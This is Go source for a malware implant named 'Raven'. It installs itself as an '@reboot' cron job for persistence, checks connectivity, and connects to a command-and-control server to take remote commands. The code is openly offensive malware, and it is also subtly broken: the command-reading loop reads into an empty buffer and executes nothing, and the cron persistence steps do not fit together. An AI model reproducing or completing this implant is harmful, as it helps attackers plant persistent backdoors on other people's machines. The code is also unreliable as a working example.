package main

import (
	"bufio"
	"fmt"
	"net"
	"net/http"
	"os"
	"os/exec"
	"strings"
	"time"
)

const (
	HOST = "127.0.0.1"
	PORT = 12345
)

func main() {
	fmt.Println("[*] Initializing Raven ...")

	if !is_persistent() {
		persist()
	}

	reach_command_and_control()
}

func is_persistent() bool {
	// check whether or not a cronjob exists for the program

	flag := "raven"
	file, _ := os.Open("/etc/crontab")
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := scanner.Text()
		if strings.Contains(line, flag) {
			return true
		}
	}
	return false
}

func persist() {
	// achieve persistence by creating a cronjob

	cmd := exec.Command("crontab", "-e")
	cmd.Run()
	f, _ := os.OpenFile("/tmp/crontab", os.O_APPEND|os.O_WRONLY, 0644)
	file_path, _ := os.Executable()
	line := fmt.Sprintf("@reboot %s", file_path)
	fmt.Fprintln(f, line)
	cmd = exec.Command("crontab", "/tmp/crontab")
	cmd.Run()
	os.Remove("/tmp/crontab")

}

func has_internet_access() bool {
	// attempt to connect to some live host

	_, err := http.Get("https://google.com")
	return err == nil
}

func reach_command_and_control() {
	// connect to c2 and initiate communication

	if has_internet_access() {
		addr := fmt.Sprintf("%s:%d", HOST, PORT)
		conn, err := net.Dial("tcp", addr)
		if err != nil {
			time.Sleep(time.Second * 30)
			reach_command_and_control()
		} else {
			// communication with C2
			engage_via(conn)
		}
	} else {
		time.Sleep(time.Second * 30)
		reach_command_and_control()
	}
}

func engage_via(conn net.Conn) {
	// continually receive commands from c2 and act on them

	for {
		var cmd string
		conn.Read([]byte(cmd))
		fmt.Println(cmd)
	}
}
